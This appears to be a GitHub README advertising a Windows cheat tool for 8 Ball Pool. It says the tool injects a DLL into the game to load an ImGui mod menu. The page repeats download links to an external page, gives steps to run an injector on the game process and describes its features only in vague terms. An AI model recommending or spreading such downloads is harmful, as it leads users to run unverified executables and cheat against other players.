# 8 Ball Pool X v2026 - Game Script Utility 2026

> Windows utility for 8 Ball Pool that uses DLL injection to load an ImGui overlay and provide menu-driven controls during gameplay.

[![Game Script](https://img.shields.io/badge/Type-Game%20Script-green?style=flat-square)](https://github.com)
[![Platform](https://img.shields.io/badge/Platform-Windows-blue?style=flat-square)](https://github.com)
[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
[![Stars](https://img.shields.io/github/stars/leograypin5812/8-ball-pool-x-script?style=flat-square)](https://github.com/leograypin5812/8-ball-pool-x-script)

---

<p align="center">
  <a href="https://leograypin5812.github.io/8-ball-pool-x-script/">
    <img src="https://img.shields.io/badge/Download-8%20Ball%20Pool%20X%20Script-brightgreen?style=for-the-badge" alt="Download 8 Ball Pool X Script">
  </a>
</p>

> **[Download 8 Ball Pool X](https://leograypin5812.github.io/8-ball-pool-x-script/)**

---

[Download Latest Build](https://leograypin5812.github.io/8-ball-pool-x-script/)

---

## About the Utility

8 Ball Pool X is a Windows-based game-script utility for 8 Ball Pool. It enters the running game through a DLL injection process and displays an ImGui overlay that can be used to manage available settings and actions from inside the game.

Rather than functioning as an independent launcher, the project follows a mod-menu approach. Its main purpose is to provide an accessible in-game panel, a direct loader workflow, and toggle controls that can be enabled or disabled through the overlay.

---

## Included Capabilities

- Loads into the target process through DLL injection
- Displays an ImGui interface during gameplay
- Provides a mod-menu layout for accessing available controls
- Supports Windows systems
- Includes toggles for switching controls on or off
- Uses a loader-oriented startup process
- Provides a utility structure for game-side adjustments
- Built specifically for 8 Ball Pool

---

## Installation and Launch

1. Get the newest build using the download link above.
2. Unpack the downloaded files into an easily accessible directory.
3. Start the included loader or injector and attach the DLL to the 8 Ball Pool process.
4. Open the game overlay and operate the controls through its menu.

A typical launch sequence is:

- Open 8 Ball Pool
- Start the loader or injector
- Wait for the ImGui panel to load
- Configure the available options from the menu

---

## Available Controls

| Setting | Description |
| --- | --- |
| Overlay | Displays the in-game ImGui panel |
| Menu toggles | Enables or disables individual controls |
| Loader path | Uses the DLL injection startup method |
| Target process | Selects the active 8 Ball Pool window |
| Window focus | Keeps interaction associated with the current game session |

The basic interaction model is organized as follows:

| Control | Action |
| --- | --- |
| Insert / Hotkey | Show or hide the overlay |
| Menu click | Switch a feature on or off |
| Loader action | Inject the DLL into the selected process |

---

## Compatibility and Requirements

- Platform: Windows
- Target game: 8 Ball Pool
- Delivery method: DLL injection
- Interface: ImGui overlay and mod menu

Known limitations:

- The target process must already be running before injection
- Operation depends on the active game client and its process state
- Overlay results can differ depending on window mode and system configuration

---

## Frequently Asked Questions

### What is the basic startup process?

Download and extract the build, then use the included loader or injector with the running 8 Ball Pool process.

### How are features controlled?

Once the ImGui overlay is visible, use its menu toggles to adjust the script's available options.

### Is the utility available for platforms other than Windows?

The current build is intended for Windows only.

### Can the menu be adjusted?

Yes. The interface is based on menu entries and toggle-style settings.

### Where should the files be placed?

Store the DLL, loader, and related files in a directory that is easy to locate. When launching, direct the injector to the active target process.

### What is the update procedure?

Download the newest build, replace the previous files, and perform the standard loading process again.

---

## License

GNU GPL v3.0 - see [LICENSE](LICENSE) for details.
